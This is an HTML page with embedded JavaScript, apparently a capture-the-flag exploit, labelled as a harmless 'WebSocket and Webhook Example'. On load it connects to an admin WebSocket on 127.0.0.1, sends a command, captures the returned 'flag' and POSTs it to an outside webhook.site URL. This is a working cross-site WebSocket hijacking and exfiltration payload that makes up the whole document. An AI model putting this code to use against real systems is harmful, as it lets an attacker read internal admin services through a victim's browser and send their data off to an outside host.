<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket and Webhook</title>
</head>
<body>
    <h1>WebSocket and Webhook Example</h1>
    <p>The POST request will be sent immediately, and the WebSocket will connect in parallel.</p>

    <script>
        // WebSocket URL
        const websocketURL = "ws://127.0.0.1:8080/admin/ws";

        // Webhook URL (without query parameter)
        const webhookBaseURL = "https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a";

        // Create a new WebSocket connection
        const socket = new WebSocket(websocketURL);

        // Open WebSocket connection and send "flag" when connected
        socket.onopen = function(e) {
            socket.send("increment");
        };

        socket.onmessage = function(event) {
            const flag = event.data; // Capture the flag from the WebSocket message
            sendPostToWebhook(flag); // Now send the POST request with the flag
        };

        socket.onclose = function(event) {
            if (event.wasClean) {
                alert(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
            } else {
                alert('[close] Connection died');
            }
        };

        // Function to send POST request to Webhook
        function sendPostToWebhook(flag) {
            console.log("Sending POST request to Webhook");

            // Create the URL with the query parameter
            const webhookURLWithFlag = `${webhookBaseURL}/flag=${encodeURIComponent(flag)}`;

            // Send POST request to Webhook with the flag as part of the URL
            return fetch(webhookURLWithFlag, {
                method: "POST", // Use POST method
            })
            .then(response => {
                if (response.ok) {
                    console.log("POST request sent successfully!");
                } else {
                    console.error("Failed to send POST request:", response.statusText);
                }
            })
            .catch(error => {
                console.error("Error sending POST request:", error);
            });
        }
    </script>
</body>
</html>
